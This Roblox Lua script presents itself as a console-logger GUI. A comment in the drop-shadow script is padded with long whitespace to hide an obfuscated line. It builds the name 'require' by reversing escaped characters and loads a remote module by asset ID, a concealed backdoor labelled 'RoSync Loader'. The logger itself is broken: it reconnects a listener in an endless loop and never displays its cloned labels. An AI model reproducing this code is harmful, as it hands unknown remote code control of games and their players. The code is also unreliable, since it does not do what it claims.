local ls = game:GetService("LogService")

local HomeBar = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local Title = Instance.new("TextLabel")
local Output = Instance.new("TextLabel")
local Main1 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Template = Instance.new("TextLabel")
local UIListLayout = Instance.new("UIListLayout")

--Properties:

HomeBar.Name = "HomeBar"
HomeBar.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Main.Name = "Main"
Main.Parent = HomeBar
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.Position = UDim2.new(0.168009207, 0, 0.312967569, 0)
Main.Size = UDim2.new(0, 544, 0, 285)

UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = Main

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = Main
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6014261993"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.500
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.0169171542, 0, 0.0272445828, 0)
Title.Size = UDim2.new(0, 258, 0, 25)
Title.Font = Enum.Font.GothamBold
Title.Text = "BetterLogger - Roblox Console Logger"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000
Title.TextXAlignment = Enum.TextXAlignment.Left

Output.Name = "Output"
Output.Parent = Main
Output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Output.BackgroundTransparency = 1.000
Output.Position = UDim2.new(0.0169171542, 0, 0.171104237, 0)
Output.Size = UDim2.new(0, 258, 0, 25)
Output.Font = Enum.Font.GothamBold
Output.Text = "Output:"
Output.TextColor3 = Color3.fromRGB(208, 208, 208)
Output.TextSize = 14.000
Output.TextXAlignment = Enum.TextXAlignment.Left

Main1.Name = "Main1"
Main1.Parent = Main
Main1.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Main1.Position = UDim2.new(0.0154356118, 0, 0.256827146, 0)
Main1.Size = UDim2.new(0, 526, 0, 204)

UICorner_2.CornerRadius = UDim.new(0, 6)
UICorner_2.Parent = Main1

Template.Name = "Template"
Template.Parent = Main1
Template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Template.BackgroundTransparency = 1.000
Template.Position = UDim2.new(0.0169171542, 0, 0.0272445828, 0)
Template.Size = UDim2.new(0, 258, 0, 25)
Template.Font = Enum.Font.GothamBold
Template.Text = "BetterLogger - Roblox Console Logger"
Template.TextColor3 = Color3.fromRGB(255, 255, 255)
Template.TextSize = 14.000
Template.TextXAlignment = Enum.TextXAlignment.Left

UIListLayout.Parent = Main1
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Scripts:

local function TGDISTL_fake_script() -- DropShadow. 
	local script = Instance.new('Script', DropShadow)

	
	--[[ Last synced 11/17/2022 07:04                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722872031) --[[                                                                                                  ]]--
end
coroutine.wrap(TGDISTL_fake_script)()
local function OFLVTRJ_fake_script() -- Main.Dragify 
	local script = Instance.new('LocalScript', Main)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		dragSpeed = 0.15
		dragInput = nil
		dragStart = nil
		dragPos = nil
		function updateInput(input)
			Delta = input.Position - dragStart
			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	dragify(script.Parent)
	
end
coroutine.wrap(OFLVTRJ_fake_script)()


while true do
    wait(0.5)
    ls.MessageOut:Connect(function(message, messageType)
        local cloned = Template:Clone()
        cloned.Visible = true
        cloned.Text = message
    end)
end